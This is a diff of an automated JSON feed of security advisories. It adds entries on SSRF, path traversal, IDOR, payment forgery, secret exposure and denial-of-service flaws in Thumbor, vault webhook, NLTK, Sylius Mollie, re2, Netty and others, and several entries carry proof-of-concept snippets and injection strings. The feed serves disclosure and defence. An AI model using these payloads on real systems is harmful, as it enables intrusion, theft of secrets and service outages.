@@ -1,8 +1,8 @@
 {
-  "generated": "2026-07-31T13:26:48.516347+00:00",
+  "generated": "2026-07-31T19:04:18.531551+00:00",
   "total": 24,
   "kev": 0,
-  "zero_day": 10,
+  "zero_day": 9,
   "enriched": 0,
   "findings": [
     {
@@ -33,23 +33,6 @@
       ],
       "cve_ids": [
         "CVE-2024-57727"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.rapid7.com/blog/post/etr-kindarails2shell-cve-2026-66066-critical-arbitrary-file-read-and-possible-remote-code-execution-in-ruby-on-rails",
-      "title": "KindaRails2Shell: CVE-2026-66066, Critical Arbitrary File Read and Possible Remote Code Execution in Ruby on Rails",
-      "summary": "Overview On July 29, 2026, the Ruby on Rails project published a security advisory for CVE-2026-66066 , a critical vulnerability affecting Active Storage image processing when used in conjunction with the libvips image processing library. The vulnerability has a CVSSv4 score of 9.5 and is classified as Initialization of a Resource with an Insecure Default ( CWE-1188 ). An unauthenticated attacker may be able to leverage CVE-2026-66066 and read files accessible to the Rails application process, potentially exposing secrets that could enable remote code execution (RCE) or access to connected systems. An application is affected when it uses libvips for Active Storage image processing and accepts image uploads from untrusted users. Rails notes that generating image variants is not a separate requirement for exposure. Vips is the default Active Storage variant processor for applications configured with Rails 7.0 or later defaults. According to Ethiack , only the Vips processor is affected; applications using Magick are not affected through the reported vector. As of July 30, 2026, Rapid7 is not aware of exploitation in the wild. Ethiack and GMO Flatt Security, who independently reported the vulnerability, have withheld proof-of-concept code and details of the full attack chain. Public code claiming to exploit CVE-2026-66066 exists, but it is unclear how closely it corresponds to the full attack chain reported privately to Rails. According to the Rails Security Announcement , additional details will be disclosed no later than August 28, 2026. Rapid7 recommends remediating affected applications on an urgent basis, outside of normal patch cycles. Update #1 : On July 31, 2026, Rails published technical details and forensic tools earlier than its planned August 28 disclosure date after several researchers reverse-engineered the attack and published proof-of-concept code. Technical overview libvips uses operations to load and save image formats, including operations backed by ",
-      "link": "https://www.rapid7.com/blog/post/etr-kindarails2shell-cve-2026-66066-critical-arbitrary-file-read-and-possible-remote-code-execution-in-ruby-on-rails",
-      "published": "2026-07-30T16:11:10+00:00",
-      "source": "Rapid7 Blog",
-      "tags": [
-        "research",
-        "metasploit"
-      ],
-      "cve_ids": [
-        "CVE-2026-66066"
       ],
       "is_zero_day": true,
       "is_high_severity": true
@@ -167,6 +150,222 @@
       "is_high_severity": false
     },
     {
+      "id": "CVE-2026-53500",
+      "title": "Thumbor treats ALLOWED_SOURCES string patterns as unescaped regex, allowing hostname bypass via wildcard dot",
+      "summary": "## Summary\n\nThe `ALLOWED_SOURCES` configuration is meant to restrict which hosts Thumbor's HTTP loader may fetch images from. Plain-string entries in that list (the overwhelming majority of real-world and documented configurations) are passed directly to `re.match()` without escaping. Because `.` is a regex wildcard, every dot in a domain name becomes a bypass vector: `s.glbimg.com` silently matches `sXglbimgYcom`, `sAglbimg.com`, and any other hostname that differs only at a dot position. This undermines the primary SSRF defence that `ALLOWED_SOURCES` is intended to provide.\n\n## Affected component\n\n`thumbor/loaders/http_loader.py` \u2014 `validate()`\n\n## Proof of concept\n\n```python\nimport re\nfrom thumbor.config import Config\nfrom thumbor.context import Context\nfrom thumbor.loaders import http_loader as loader\n\nconfig = Config()\nconfig.ALLOWED_SOURCES = [\"s.glbimg.com\"]   # typical user config\nctx = Context(None, config, None)\n\n# These should be blocked \u2014 both return True due to the unescaped dot\nprint(loader.validate(ctx, \"http://sXglbimgYcom/secret.jpg\"))  # True \u2190 bypass\nprint(loader.validate(ctx, \"http://sAglbimg.com/secret.jpg\"))  # True \u2190 bypass\n\n# Legitimate origin \u2014 correctly allowed\nprint(loader.validate(ctx, \"http://s.glbimg.com/logo.jpg\"))    # True \u2190 correct\n```\n\n## Root cause\n\n`thumbor/loaders/http_loader.py` (before fix):\n\n```python\nfor pattern in context.config.ALLOWED_SOURCES:\n    if isinstance(pattern, Pattern):\n        match = url\n    else:\n        pattern = f\"^{pattern}$\"   # <-- dots not escaped, act as regex wildcard\n        match = res.hostname\n\n    if re.match(pattern, match):\n        return True\n```\n\n## Impact\n\nAn attacker who can influence the image source URL passed to Thumbor can fetch images from arbitrary hosts, bypassing the `ALLOWED_SOURCES` allowlist.\n\n**Preconditions:**\n\n- `ALLOWED_SOURCES` contains at least one plain-string entry (the common case; all official documentation examples use plain strings).\n- The attacker can supply or influe",
+      "link": "https://github.com/advisories/GHSA-6x26-6r6f-m537",
+      "published": "2026-07-31T18:36:03Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-53500"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54725",
+      "title": "vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API",
+      "summary": "## Summary\n\nThe vault-secrets-webhook reads the `vault.security.banzaicloud.io/vault-addr` annotation from any ConfigMap or Secret being admitted and uses it as the Vault server address without any validation or allowlist. When a ConfigMap or Secret contains a value prefixed with `vault:`, the webhook's admission handler synchronously calls the Vault API at the attacker-supplied address from inside the webhook process during the admission review. The webhook additionally grants `serviceaccounts/token:create` cluster-wide, and the `vault-serviceaccount` annotation controls which ServiceAccount's JWT is fetched and sent to that address. An attacker who can create ConfigMaps or Secrets in a watched namespace can cause the webhook process to make arbitrary outbound HTTP connections and exfiltrate ServiceAccount JWTs.\n\n## Details\n\n`parseVaultConfig()` at `pkg/webhook/config.go:102-107` reads `VaultAddrAnnotation` unconditionally into `vaultConfig.Addr`:\n\n```go\nif value, ok := annotations[common.VaultAddrAnnotation]; ok {\n    vaultConfig.Addr = value\n}\n```\n\nNo URL scheme validation, no hostname allowlist, no RFC-1918 or link-local filter.\n\n`MutateConfigMap` and `MutateSecret` at `pkg/webhook/configmap.go` and `pkg/webhook/secret.go` call `mw.newVaultClient(ctx, vaultConfig)` when the object contains at least one `vault:...` value. Inside `newVaultClient`, at `pkg/webhook/webhook.go:285`:\n\n```go\nclientConfig.Address = vaultConfig.Addr\n```\n\n`vault.NewClientFromConfigWithContext` then opens an HTTP connection to the attacker-controlled address from the webhook server process, synchronously during the admission review. This is not deferred to a separate pod.\n\nThe `vault-skip-verify` annotation (`pkg/webhook/config.go:197`) sets `InsecureSkipVerify: true` on the TLS config, eliminating the need for a valid certificate on the attacker's server.\n\nWhen `VaultServiceaccountAnnotation` is also set, at `pkg/webhook/webhook.go`:\n\n```go\nmw.k8sClient.CoreV1().ServiceAccounts(vaultConfi",
+      "link": "https://github.com/advisories/GHSA-r2v3-8gwf-7ghm",
+      "published": "2026-07-31T17:45:02Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54725"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55100",
+      "title": "hashi-vault-js has a path traversal and query parameter injection",
+      "summary": "## Summary\n\nThe `hashi-vault-js` library is vulnerable to path traversal and query string injection due to the lack of proper encoding of identifiers in path segments and query strings. This allows attackers to manipulate the request URL and potentially access unintended downstream endpoints or inject malicious parameters if untrusted input is passed to the library.\n\n## Details\n\nThere are zero calls to `encodeURIComponent` anywhere in `Vault.js`. Every identifier (e.g., name, username, group, role, version) provided to the library is concatenated straight into the HTTP URL without URI encoding.\n\nTwo vectors can be dynamically confirmed:\n\n1. **Path Traversal:** Passing `../../sys/seal` as a secret name causes the HTTP client to normalize the path and send the request to `/v1/sys/seal` instead of the intended Key-Value path.\n2. **Query Injection:** Passing `1&list=true` as a version value injects an extra query parameter into the request payload.\n\n## Impact\n\nIn applications where Vault identifiers originate from untrusted user input, this allows an unauthenticated attacker to redirect requests to unintended Vault endpoints (including administrative paths under `sys/`) or otherwise alter the executed query, executing operations within the permissions of the Vault token used by the application.\n\n## Patches\n\nThis vulnerability has been addressed by wrapping path segments with `encodeURIComponent()` and safely formatting query strings instead of manual string concatenation. Users should upgrade to a version that includes this fix.\n\n## Workarounds\n\nIf you cannot immediately update the library, you can mitigate this issue by rigidly validating and sanitizing all user-supplied input before passing it into `hashi-vault-js` methods. Alternatively, manually encode inputs using `encodeURIComponent()` before supply them to the library's functions.\n\n## Acknowledgements\n\nhashi-vault-js would like to thank Sebasti\u00e1n Alba Vives for reporting this vulnerability.",
+      "link": "https://github.com/advisories/GHSA-g956-2f74-rmv7",
+      "published": "2026-07-31T17:03:27Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55100"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54729",
+      "title": "dssrf: any users using 1.1.1.1 DNS is impacted by SSRF",
+      "summary": "## Summary\n\nis_url_safe can treat localhost as safe when DNS resolver 1.1.1.1 returns NXDOMAIN because dns.resolve4 yields no address and no dns.lookup fallback occurs, allowing server-side request forgery.\n\n## POC\n\nExample to simulate 1.1.1.1 in version before 1.5.0 of dssrf:\n\n```js\nimport { is_url_safe } from '../dist/helpers.js';\nimport dns from 'dns';\n\n\ndns.setServers(['1.1.1.1']);\n\nconst TARGET = 'http://localhost/admin';\n\nconsole.log(`Testing: ${TARGET}`);\nconsole.log(`Current DNS Servers: ${dns.getServers()}`);\n\nconst result = await is_url_safe(TARGET);\n\nif (result === true) {\n    console.log('dssrf treated localhost as SAFE because 1.1.1.1 returned NXDOMAIN.');\n} else {\n    console.log('dssrf blocked localhost.');\n}\n```",
+      "link": "https://github.com/advisories/GHSA-5846-7qm3-r52j",
+      "published": "2026-07-31T16:58:42Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54729"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-65835",
+      "title": "Capsule has an incomplete fix of CVE-2026-22872: TenantResource RawItems and Generators still allow cluster-scoped resource creation (cross-tenant privilege escalation)",
+      "summary": "### Summary\nCVE-2026-22872 (GHSA-qjjm-7j9w-pw72) reported that a Tenant Owner could create cluster-scoped resources\n(e.g. `ClusterRole`, `ValidatingWebhookConfiguration`) through a `TenantResource`, because the controller\napplies them with its cluster-admin ServiceAccount and `SetNamespace` is ineffective for cluster-scoped\nkinds. The v0.13.0 fix added a cluster-scope rejection guard, but **only on the NamespacedItems selection\npath** (`ResourceReference.LoadResources` -> `IsNamespacedGVK`, error `\"cluster-scoped kind ... is not\nallowed\"`). The **RawItems create path \u2014 the exact vector the original advisory named \u2014 and the Generators\npath were not given this guard.** The vulnerability therefore persists in all releases **v0.13.0 through\nv0.13.7** and on trunk HEAD (`8d89d6865d`).\n\n### Details\nTenantResource reconcile flow:\n- `internal/controllers/resources/namespaced.go` `reconcile()` obtains the apply client via `loadClient()`;\n  by default (impersonation off, no `Spec.ServiceAccount`) this is the manager client whose SA is bound to\n  cluster-admin (`charts/capsule/templates/rbac.yaml:488-501`, `{fullname}-manager-rolebinding` ->\n  roleRef cluster-admin).\n- `Collector.Collect()` (`collect.go`) processes `spec.RawItems` via `handleRawItem` and `spec.Generators`\n  via `handleGeneratorItem`.\n\n`handleRawItem` (`collect.go:406-425`, trunk HEAD \u2014 byte-identical to v0.13.0):\n```go\ntmplString := tpl.FastTemplate(string(item.Raw), opts.Iterator.FastContext)\nobj := &unstructured.Unstructured{}\nunstructured.UnstructuredJSONScheme.Decode([]byte(tmplString), nil, obj)\nif ns != nil { obj.SetNamespace(ns.Name) }   // ONLY mitigation\nreturn obj, nil                                // NO IsNamespacedGVK / allowClusterScoped guard\n```\n`handleGeneratorItem` (`collect.go:382-404`) is the same: it only `SetNamespace`s on rendered objects.\n\nThe accumulated objects flow to `pkg/api/processor/processor_func.go` `Reconcile()` -> `Apply()` ->\n`clt.PatchApply(ctx, c, obj, ...)` (line 167/378)",
+      "link": "https://github.com/advisories/GHSA-jr6p-8pjj-mfx6",
+      "published": "2026-07-31T16:53:42Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-65835"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-68499",
+      "title": "re2: Global `String.prototype.match` with an empty-matchable pattern never advances \u2192 infinite loop with unbounded native memory growth (DoS)",
+      "summary": "## Summary\n\n`String.prototype.match` with a **global** `RE2` collects all matches in a native loop that advances the cursor by the match length. A **zero-width (empty) match** has length 0, so the cursor never advances: the same empty match is found forever and appended to an ever-growing native vector. Any pattern that can match the empty string (`a*`, `b?`, `x{0,3}`, `(a)|`, `(?:)`, \u2026) therefore causes an infinite loop with unbounded memory growth. The call is synchronous native code, so it blocks the entire event loop and cannot be interrupted by `try/catch`, `AbortController`, `--max-old-space-size`, or timers \u2014 the process must be killed externally. This diverges from the built-in engine, where `'xxxx'.match(/a*/g)` returns a finite array.\n\n## Root cause\n\n```cpp\n// lib/match.cc:44 \u2014 global branch of WrappedRE2::Match\nwhile (re2->regexp.Match(str, byteIndex, str.size, anchor, &match, 1)) {\n    groups.push_back(match);\n    byteIndex = match.data() - str.data + match.size();   // += 0 for a zero-width match\n}\n```\n\nWhen `match.size() == 0`, `byteIndex` is unchanged, so the next iteration matches the same empty position again; `groups` grows without bound. The other iteration paths already guard this: `lib/split.cc:50-55` advances by `getUtf8CharSize` on an empty match, and `exec` advances `lastIndex`. Only this global `Match` loop is missing the guard.\n\n## Proof of concept\n\n```js\nconst RE2 = require('re2');\n'x'.match(new RE2('a*', 'g'));   // never returns; grows memory until OOM\n// also: 'b?', 'x{0,3}', '(a)|', 'c*d*', '(?:)'; empty subject '' triggers it too\n```\n\nCompare with the built-in engine, which terminates:\n\n```js\n'xxxx'.match(/a*/g);   // -> [\"\", \"\", \"\", \"\", \"\"]\n```\n\nMeasured on a clean `npm install re2@1.25.1` (latest), stock prebuilt binary: resident memory grew **~550 MB \u2192 2.3 GB in ~3 seconds** at 100% CPU, and the process had to be `SIGKILL`ed externally.\n\n## Impact\n\nDenial of service. Reachable remotely and without authentication wherever an applica",
+      "link": "https://github.com/advisories/GHSA-6hxr-mr5r-9836",
+      "published": "2026-07-31T16:53:08Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-68499"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-68501",
+      "title": "Sylius Mollie Plugin has unauthenticated IDOR that leaks order token and customer PII",
+      "summary": "### Impact\nTwo unauthenticated Mollie shop endpoints look up orders by a sequential integer `orderId`\nwith no ownership or session check. Chained, they expose customer PII.\n\n`GET /{_locale}/thank-you` (`PageRedirectController::thankYouAction`, route\n`sylius_mollie_shop_thank_you_page_redirect`) loads the order with `findOneBy(['id' => $orderId])`\nand returns a `302` whose `Location` header carries that order's `tokenValue`. Any `orderId`\nthus yields that order's token. A non-existent id dereferences null and returns a `500`. The\nhandler also writes the raw `orderId` into the session.\n\n`GET /{_locale}/get-code` (`QrCodeAction::fetchQrCodeFromOrder`, route\n`sylius_mollie_shop_get_qr_code`) runs the same lookup and returns the order's QR code and id\nas JSON, ignoring the session cart; this is where the front-end got the integer id. A bad id\n`500`s here too.\n\nThat `tokenValue` is the order's only access control. Passed to the Sylius core page\n`GET /{_locale}/register-after-checkout/{tokenValue}` it returns a form pre-filled with the\ncustomer's first name, last name and email. The full attack: enumerate `orderId`, read the\ntoken from the redirect, read the PII, at roughly a 1-in-71 hit rate for guest orders.\n`register-after-checkout` is Sylius core, not the plugin, and trusts the token by design, so\nthe leak is what must be fixed.\n\nNone of the plugin endpoints require a login, session or CSRF token.\n\n### Patches\nFixed in **2.2.8**, **3.2.4** and **3.3.1**. \n\n### Workarounds\nIf you cannot upgrade immediately, patch both endpoints at the project level by decorating\nthe plugin controllers. The decorators enforce ownership before delegating to the original\ncontroller, so no plugin behaviour is lost. They keep the original `orderId` request contract,\nso no front-end or asset changes are required. Works on both 2.2 and 3.x.\n\n#### Step 1. Decorate the QR code controller\nCreate `src/Controller/Mollie/SecureQrCodeAction.php` in your Sylius project:\n\n```php\n<?php\n\ndeclare(strict_t",
+      "link": "https://github.com/advisories/GHSA-x83g-979r-f5fh",
+      "published": "2026-07-31T16:52:59Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-68501"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-68500",
+      "title": "Sylius Mollie Plugin vulnerable to payment status forgery via the payment webhook",
+      "summary": "### Impact\n  The shop payment webhook `POST /{_locale}/update-payment` (route\n  `sylius_mollie_shop_payment_webhook`) accepts two independent, attacker-controlled\n  parameters: `id` (the Mollie payment ID, verified against Mollie's API) and `orderId` (the\n  Sylius order ID, read directly from the database). The handler never verifies that the\n  Mollie payment belongs to the referenced order.\n\n  An unauthenticated attacker who holds any valid **paid** Mollie payment ID, for example\n  from a EUR 1 order they placed themselves, can submit it together with any victim\n  `orderId`. The victim's order payment is then transitioned to `completed` (or any other\n  Mollie-derived state) without any funds being transferred for that order. Sylius order IDs\n  are sequential integers, and the endpoint requires no authentication, CSRF token or rate\n  limiting, so the attack scales trivially across all pending orders.\n  \n  ### Patches\n  Fixed in versions **2.2.8**, **3.2.4** and **3.3.1**. The webhook now binds the payment to\n  the order: it reads the Mollie payment ID stored server-side for that order when the payment\n  was created and compares it to the incoming Mollie payment ID. On mismatch the request is\n  acknowledged with `HTTP 200` and no state change is applied. `HTTP 200` is intentional,\n  because Mollie retries the webhook on any non-2xx response.\n\n  The stored ID lives in one of two places depending on the checkout flow, and the fix reads\n  both of them (mirroring `CaptureAction`):\n  \n  - `payment.getDetails()['payment_mollie_id']` for the standard Shop API and Apple Pay Direct\n    flows, stored in `CreatePaymentAction`.\n  - `order.getMolliePaymentId()` for the QR-code flow, which stores the ID on the order itself\n    (`QrCodeAction`).\n\n  Reading only the payment details would reject legitimate QR-code payments, because their\n  payment details carry no `payment_mollie_id`, so both sources must be consulted.\n\n  ### Workarounds\n  If you cannot upgrade immediately, patch the",
+      "link": "https://github.com/advisories/GHSA-rc52-c4hv-w89p",
+      "published": "2026-07-31T16:52:39Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-68500"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-56819",
+      "title": "Netty: HTTP/2 decompression leaks ByteBuf reference count when the decompressor channel is already closed (Direct memory leak / OOM DoS)",
+      "summary": "### Summary\n\nA remote, unauthenticated peer can leak one direct `ByteBuf` per HTTP/2 `DATA` frame in\napplications that enable HTTP/2 content decompression via `DelegatingDecompressorFrameListener`.\nWhen a `DATA` frame is processed for a stream whose decompressor has already been closed,\n`Http2Decompressor.decompress(...)` retains the frame buffer but never releases it on the error\npath, so its reference count never returns to zero. Repeating this over a long-lived HTTP/2\nconnection exhausts direct memory and crashes the JVM with `OutOfMemoryError` \u2014 a denial of service.\n\n### Details\n\nIn `codec-http2/src/main/java/io/netty/handler/codec/http2/DelegatingDecompressorFrameListener.java`,\n`Http2Decompressor.decompress(...)` does:\n\n```java\n// around line 433\ndecompressor.writeInbound(data.retain());\n```\n\nThe argument `data.retain()` is evaluated **before** `writeInbound(...)` executes, incrementing the\nbuffer's reference count (`refCnt: 1 -> 2`). The very first statement of\n`EmbeddedChannel.writeInbound(...)` is `ensureOpen()` (`EmbeddedChannel.java:360`), which throws\n`ClosedChannelException` when the decompressor's internal `EmbeddedChannel` has already been closed.\n\nWhen that happens:\n- the `DATA` payload has been `retain()`ed but never entered the pipeline, so the decoder's\n  `finally { release() }` never runs;\n- the surrounding `catch (Throwable t)` block in `decompress(...)` (around line 451) does **not**\n  release the extra reference;\n- the input buffer therefore can never reach refCnt 0, and its (typically direct) memory is leaked.\n\nThe decompressor channel is closed on a reachable path:\n`Http2Connection` `onStreamRemoved` \u2192 `Http2Decompressor.cleanup()` \u2192\n`EmbeddedChannel.finishAndReleaseAll()`\n(`DelegatingDecompressorFrameListener.java:125-133` and `418-420`).\n\nA peer that sends `DATA` frames for a stream whose decompressor has already been cleaned up (e.g.\ncontinuing to send `DATA` after `END_STREAM` / stream removal) thus leaks one direct `ByteBuf` per\nframe.\n",
+      "link": "https://github.com/advisories/GHSA-93wv-jw9v-4972",
+      "published": "2026-07-31T16:51:50Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-56819"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-12075",
+      "title": "Natural Language Toolkit (NLTK): DNS-rebinding SSRF filter bypass in nltk.pathsec.urlopen (nltk.download / nltk.data.load) defeats ENFORCE mode",
+      "summary": "### Summary\n`nltk.pathsec` provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict `ENFORCE` mode for security-sensitive environments. The filter is bypassable by DNS rebinding: `validate_network_url()` resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under `nltk.pathsec.ENFORCE = True`.\n\n\n### Details\n`urlopen()` validates, then hands the raw hostname to `urllib`, which performs a second name resolution deep in the connection layer (`http.client.HTTPConnection.connect` \u2192 `socket.create_connection` \u2192 `socket.getaddrinfo`). The validation-side and connection-side resolutions are fully independent code paths with independent caches:\n\n1. `validate_network_url()` calls `_resolve_hostname(parsed.hostname)` and checks each returned IP against loopback/link-local/multicast/private, blocking under `ENFORCE`. (Resolution #1.)\n2. `urlopen()` then calls `build_opener(...).open(url)` with the original URL (raw hostname), so `urllib` resolves the hostname again at connect time. (Resolution #2 \u2014 the address actually connected to.)\n\n`_resolve_hostname` is decorated with `lru_cache` and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer's `getaddrinfo` does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.\n\n\n### PoC\n```python\nimport socket\nimport threading\nimport warnings\nfrom collections import defaultdict\nfrom ht",
+      "link": "https://github.com/advisories/GHSA-qvv7-cg9c-w4x3",
+      "published": "2026-07-31T16:51:29Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-12075"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-12074",
+      "title": "Natural Language Toolkit (NLTK) has path traversal in FramenetCorpusReader.frame() that allows arbitrary XML file read, bypassing the nltk.pathsec sandbox (ENFORCE=True)",
+      "summary": "### Summary\n`FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox \u2014 including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.\n\n\n### Details\n`frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.\n\nThe same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:\n- `doc()` \u2014 uses the index entry `filename` field\n- the lexical-unit file loader \u2014 uses the `lexUnit` ID attribute\n\nThese are reachable through a malicious or attacker-modified FrameNet corpus index.\n\n### PoC\n```python\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport warnings\nfrom pathlib import Path\n\nwarnings.filterwarnings(\"ignore\")\n\n# --- Turn the documented strict sandbox ON, before importing the reader. ---\nimport nltk.pathsec as ps\nps.ENFORCE = True\n\nimport nltk\nfrom nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError\n\nFRAME_XML = (\n    '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n'\n    '<frame xmlns=\"http://framenet.icsi.berkeley.edu\" ID=\"1337\" name=\"pwned\">\\n'\n    \"<definition>SECRET-OUT-OF-ROOT-CONTENT</definition>\\n\"\n    \"</frame>\\n\"\n)\n\nBANNER = \"\"\"\\\n============================================",
+      "link": "https://github.com/advisories/GHSA-xh95-f55m-82fw",
+      "published": "2026-07-31T16:50:41Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-12074"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-52855",
+      "title": "Wings exposes node configuration secrets through egg configuration-file templating",
+      "summary": "### Impact\n\n**Type:** Exposure of sensitive information / insufficiently protected credentials\nleading to privilege escalation and full node compromise.\n\nWings exposes its **entire** daemon configuration to the egg configuration-file\ntemplating engine. When Wings renders a server's configuration files, any\n`{{config.<path>}}` placeholder in a replacement value is resolved against the\nfull marshalled daemon configuration, with no restriction on which paths may be\nread.\n\nBecause the Panel substitutes **user-controlled** egg variable values into these\nreplacements before sending them to Wings, a low-privileged user can smuggle a\n`{{config.*}}` placeholder through a variable value. The placeholder is then\nresolved by Wings and written into a file inside the user's own server, where it\ncan be read via the file manager or SFTP.\n\nThis allows reading, among other values:\n\n- `{{config.token}}` - the node's daemon token, which is both the API bearer for\n\u00a0\u00a0the Panel\u21c6Wings channel **and** the HMAC signing key for every JWT the node\n\u00a0\u00a0issues;\n- `{{config.token_id}}`;\n- `{{config.docker.registries}}` - configured container-registry credentials.\n\n**Who is impacted:** Any deployment where a user who is not fully trusted can set\nan egg variable value (e.g. a server owner or a subuser with the `startup.update`\npermission) **and** the server's egg renders a user-editable variable into a\nconfiguration file via `{{server.build.env.*}}`. This pattern is common across\nstock and community eggs, so most multi-tenant / shared-hosting deployments are\naffected.\n\n**Resulting impact:** Disclosure of the node daemon token lets the attacker forge\nauthentication tokens and act against **every server on that node**, a full-node compromise reachable from a low-privileged\naccount.\n\n### Patches\n\nYes. Fixed in **Wings `v1.12.3`** (Panel is unaffected; the fix is Wings-only).\n\nWings no longer exposes its full configuration to the templating engine only an\nexplicit, non-secret subset (the Docker network i",
+      "link": "https://github.com/advisories/GHSA-pfvc-3p5h-x7h6",
+      "published": "2026-07-31T16:16:46Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-52855"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "https://www.securityweek.com/critical-code-execution-vulnerability-patched-in-teamcity/",
       "title": "Critical Code Execution Vulnerability Patched in TeamCity",
       "summary": "Tracked as CVE-2026-63077, the security defect can be exploited without authentication via the agent polling protocol. The post Critical Code Execution Vulnerability Patched in TeamCity appeared first on SecurityWeek .",
@@ -197,204 +396,6 @@
       ],
       "cve_ids": [
         "CVE-2025-4318"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54522",
-      "title": "MessagePack::Buffer#clear Use-After-Free that Enables Cross-Buffer Disclosure",
-      "summary": "### Summary\n`MessagePack::Buffer#clear` shifts out every chunk and returns its 4 KiB rmem page to the shared pool, but does not reset the buffer's rmem cursor (`rmem_last`, `rmem_end`, `rmem_owner`). The next write sees \"unused rmem space\" left over from the freed page and hands back a slice of memory that has already been returned to the pool. A second `MessagePack::Buffer` then re-acquires that same page, so reading the cleared-and-rewritten buffer discloses the second buffer's bytes \u2014 a same-process use-after-free with cross-buffer information disclosure (and the symmetric write-corruption).\n\n### Details\n- `msgpack_buffer_clear()` \u2192 `_msgpack_buffer_shift_chunk()` (`ext/msgpack/buffer.c:151`, `:128`) destroys chunks (`_msgpack_buffer_chunk_destroy`, `:58`, returns the page via `msgpack_rmem_free`) but resets only `tail_buffer_end`/`read_buffer`, leaving `rmem_last`/`rmem_end`/`rmem_owner` pointing into the freed page.\n- Next `Buffer#write` \u2192 `_msgpack_buffer_chunk_malloc()` reuse branch (`:363`) returns `b->rmem_last`, a pointer into the already-freed page.\n- A second buffer's first write calls `msgpack_rmem_alloc()` and gets the same physical page back from the pool \u2192 the two buffers alias the same memory.\n- Sanitizer note: rmem (`ext/msgpack/rmem.h`) recycles pages with a slab bitmask, not `free()`, so a stock ASAN build does not abort; the cross-buffer disclosure below is the proof.\n\n### PoC\nSingle self-contained script (builds msgpack from rubygems with AddressSanitizer, then runs the PoC):\n\n```bash\nset -e\nWORK=\"$(mktemp -d)\"; cd \"$WORK\"\n\n# 1) PoC\ncat > poc.rb <<'RUBY'\nb1 = MessagePack::Buffer.new(nil, write_reference_threshold: 256)\nb1.write('M' * 1000); b1.write('A' * 200); b1.write('N' * 1000)\nb1.clear\nb1.write('C' * 128)\nsecret = ('s' * 200) + ('ABCD' * 32) + ('t' * 400)\nb2 = 